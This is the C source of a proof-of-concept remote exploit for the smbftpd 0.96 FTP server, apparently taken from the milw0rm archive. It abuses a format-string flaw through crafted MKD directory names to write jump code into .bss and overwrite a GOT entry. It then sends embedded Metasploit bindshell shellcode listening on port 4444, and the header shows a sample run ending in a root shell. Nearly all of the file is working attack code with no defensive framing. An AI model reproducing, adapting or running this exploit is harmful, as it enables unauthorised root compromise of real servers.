/*
 * smbftpd 0.96 Proof of concept
 * tested with smbftpd 0.96 compiled with gcc 3.3.6
 *
 * 1. write jumpcode to `BSS`
 *      mov dx, 0x1234
 *      pop eax
 *      cmp ax, dx
 *      jne $-4
 *      jmp esp
 * 2. overwrite a GOT entry with the addr to `BSS` & send shellcode
 *
 *  jerry:~> ./bleh -h localhost
 *  [+] GOT: 0x80591d8 - .bss (jmpcode): 0x805a791
 *  [+] localhost:21 (user: anonymous pass: )
 *  [+] PASV
 *  [+] writing jumpcode
 *  [+] PASV
 *  [+] overwriting GOT entry and sending shellcode
 *  jerry:~> nc localhost 4444
 *  id
 *  uid=0(root) gid=0(root) euid=1002(ftp) egid=1002(ftp) groups=1002(ftp)
 *
 *
 *  - Jerry Illikainen <jerry@debork.se>
 *
 */

#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>
#include <unistd.h>
#include <stdlib.h>

#define GOT 0x080591d8 // GOT entry for chdir
#define BSS 0x0805a791 // this is where the jumpcode will be written

#define DEBUG(d) if (debug) d;
#define MAXPATH 255
#define BUFSIZE 512

unsigned int debug = 0;

/* bindshell (port 4444) from metasploit.com
 * restricted chars = 0x00 0x0a 0x0d */
unsigned char shellcode[] =
	"\x31\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa3"
	"\xef\xd7\xdb\x83\xeb\xfc\xe2\xf4\x92\x34\x84\x98\xf0\x85\xd5\xb1"
	"\xc5\xb7\x4e\x52\x42\x22\x57\x4d\xe0\xbd\xb1\xb3\xb2\xb3\xb1\x88"
	"\x2a\x0e\xbd\xbd\xfb\xbf\x86\x8d\x2a\x0e\x1a\x5b\x13\x89\x06\x38"
	"\x6e\x6f\x85\x89\xf5\xac\x5e\x3a\x13\x89\x1a\x5b\x30\x85\xd5\x82"
	"\x13\xd0\x1a\x5b\xea\x96\x2e\x6b\xa8\xbd\xbf\xf4\x8c\x9c\xbf\xb3"
	"\x8c\x8d\xbe\xb5\x2a\x0c\x85\x88\x2a\x0e\x1a\x5b";


void usage (char *arg)
{
	printf("%s [options]\n"
		   "\t -h <host>\n"
		   "\t -p <port>\n"
		   "\t -u <usernmae - default anonymous>\n"
		   "\t -P <password - default none>\n\n", arg);
	exit(1);
}

int sock (int port, char *host)
{
	struct hostent *h;
	struct sockaddr_in addr;
	int s;

	if ((h = gethostbyname(host)) == NULL)
	{
		perror("[!] gethostbyname");
		exit(1);
	}
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		perror("[!] socket");
		exit(1);
	}

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr = *((struct in_addr *)h->h_addr);
	memset(addr.sin_zero, '\0', sizeof addr.sin_zero);
	if (connect(s, (struct sockaddr *)&addr, sizeof(struct sockaddr)) == -1)
	{
		perror("[!] connect");
		exit(1);
	}
	return s;
}

char *s_send (int s, char *m, char *fmt, ...)
{
	static char buf[BUFSIZE];
	char str[BUFSIZE];
	ssize_t nb;
	va_list ap;

	va_start(ap, fmt);
	vsnprintf(str, BUFSIZE-1, fmt, ap);
	va_end(ap);
	if (send(s, str, strlen(str), 0) == -1)
	{
		perror("[!] send");
		exit(1);
	}
	DEBUG(printf("send: %s\n", str));

	for (;;)
	{
		nb = recv(s, buf, BUFSIZE-1, 0);
		buf[nb-1] = '\0';
		if (m == NULL)
			return buf;
		else if (strstr(buf, m) != NULL)
			return buf;
	}
}

void fmt (int *jmpaddr, int *jmpc, int got, char mkd[][MAXPATH])
{
	unsigned char a[4], b[4];
	char *dir = mkd[0];
	unsigned int i, offset = 1052, start = 256, base = 4;
	int *pa = (int *)jmpaddr[0], *pb = (int *)jmpc[0];

	for (i = 0; i <= 4; i++)
	{
		a[0] = (int)pa >> 24;
		a[1] = ((int)pa & 0xff0000) >> 16;
		a[2] = ((int)pa & 0xff00) >> 8;
		a[3] = (int)pa & 0xff;

		b[0] = (int)pb >> 24;
		b[1] = ((int)pb & 0xff0000) >> 16;
		b[2] = ((int)pb & 0xff00) >> 8;
		b[3] = (int)pb & 0xff;

		snprintf(dir, MAXPATH-1,
				"%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c"
				"%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n",
				a[3], a[2], a[1], a[0],
				a[3] + 1, a[2], a[1], a[0],
				a[3] + 2, a[2], a[1], a[0],
				a[3] + 3, a[2], a[1], a[0],

				b[3] - 12 + start - (base + 4 - (base%4)), offset,
				b[2] - b[3] + start, offset + 1,
				b[1] - b[2] + start, offset + 2,
				b[0] - b[1] + start, offset + 3);
		
		dir = mkd[i];
		if (i < 3)
		{
			pa = (int *)jmpaddr[i];
			pb = (int *)jmpc[i];
		} else {
			pa = (int *)got;
			pb = (int *)jmpaddr[0];
		}
	}
}

int main (int argc, char **argv)
{
	int s[2], c, port = 21, pasv[5];
	unsigned int i;
	char *host = NULL, *user = "anonymous", *pass = "", *tmp, *p;
	char mkd[5][MAXPATH], sc[2048];
	int 
		got = GOT,
		jmpaddr[] = { BSS, BSS+4, BSS+8 },
		jmpc[] = {
			0x1234ba66, // mov dx, 0x1234   - 66 ba 34 12
			0xc2396658, // pop eax          - 58
			0xe4fffa75  // cmp ax,dx        - 66 39 c2
                        // jne $-4          - 75 fa
                        // jmp esp          - ff e4
		};

	while ((c = getopt(argc, argv, "h:p:u:P:?")) != -1)
	{
		switch (c)
		{
			case 'h':
				host = optarg;
				break;
			case 'p':
				port = atoi(optarg);
				break;
			case 'u':
				user = optarg;
				break;
			case 'P':
				pass = optarg;
				break;
			case '?':
			default:
				usage(argv[0]);
				break;
		}
	}
	if (host == NULL)
		usage(argv[0]);

	printf("[+] GOT: %p - .bss (jmpcode): %p\n", (void *)got, (void *)jmpaddr[0]);
	fmt(jmpaddr, jmpc, got, mkd);

	printf("[+] %s:%d (user: %s pass: %s)\n", host, port, user, pass);
	s[0] = sock(port, host);
	s_send(s[0], "331", "USER %s\n", user);
	p = s_send(s[0], NULL, "PASS %s\n", pass);
	if (strstr(p, "230") == NULL)
	{
		printf("[!] login failed\n");
		exit(1);
	}
	p = s_send(s[0], NULL, "MKD %s\nMKD %s\nMKD %s\n", mkd[0], mkd[1], mkd[2]);
	if (strstr(p, "257") == NULL)
	{
		printf("[!] couldn't make directories\n");
		exit(1);
	}

	printf("[+] PASV\n");
	p = s_send(s[0], "227", "PASV\n");
	if (strtok(p, ",") == NULL)
		exit(1);
	for (i = 0; i < 5; i++)
	{
		if ((tmp = strtok(NULL, ",")) == NULL)
		{
			printf("[!] aborting\n");
			exit(1);
		}
		pasv[i] = atoi(tmp);
	}
	s[1] = sock(pasv[3]*256+pasv[4], host);

	printf("[+] writing jumpcode\n");
	s_send(s[0], NULL, "NLST -R\n");
	s_send(s[0], NULL, "RMD %s\nRMD %s\nRMD %s\n", mkd[0], mkd[1], mkd[2]);
	close(s[1]);

	s_send(s[0], NULL, "MKD %s\n", mkd[3]);
	printf("[+] PASV\n");
	p = s_send(s[0], "227", "PASV\n");
	if (strtok(p, ",") == NULL)
		exit(1);
	for (i = 0; i < 5; i++)
	{
		if ((tmp = strtok(NULL, ",")) == NULL)
		{
			printf("[!] aborting\n");
			exit(1);
		}
		pasv[i] = atoi(tmp);
	}
	s[1] = sock(pasv[3]*256+pasv[4], host);

	memset(sc, 0x90, sizeof(sc)); // some nops before and
	memcpy(sc+3, "\x34\x12", 2); // after the "mark"
	memcpy(sc+12, shellcode, sizeof(sc)-12);
	printf("[+] overwriting GOT entry and sending shellcode\n\n");
	s_send(s[0], NULL, "NLST -R%s\n", sc);
	return 0;
}

// milw0rm.com [2007-10-01]
